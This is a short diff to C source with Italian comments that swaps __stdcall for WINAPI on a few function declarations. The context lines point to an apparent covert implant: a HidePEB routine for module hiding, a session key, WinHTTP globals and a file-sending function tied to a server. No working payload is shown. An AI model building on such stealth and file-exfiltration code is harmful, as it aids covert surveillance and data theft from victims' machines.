@@ -24,8 +24,8 @@ HINTERNET asp_global_request = 0; // Handle usato dalle winhttp per inviare/rice
 BYTE asp_global_session_key[16];
 
 // --- Altri prototipi usati dal thread ASP ---
-typedef void (__stdcall *ASP_MainLoop_t) (char *);
-typedef void (__stdcall *ExitProcess_T) (UINT);
+typedef void (WINAPI *ASP_MainLoop_t) (char *);
+typedef void (WINAPI *ExitProcess_T) (UINT);
 extern void HidePEB(HMODULE);
 
 #define HOSTNAMELEN 256
@@ -1119,7 +1119,7 @@ BOOL H_ASP_SendFile(WCHAR *file_path, DWORD byte_per_second, DWORD *response_com
 								ASP_IPC_command->out_param_len = msg_len; \
 								SAFE_FREE(message);	} else ASP_IPC_command->out_param_len = 0;
 
-void __stdcall  ASP_MainLoop(char *asp_server)
+void WINAPI ASP_MainLoop(char *asp_server)
 {
 	BOOL ret_success = FALSE;
 	char server_ip[32];
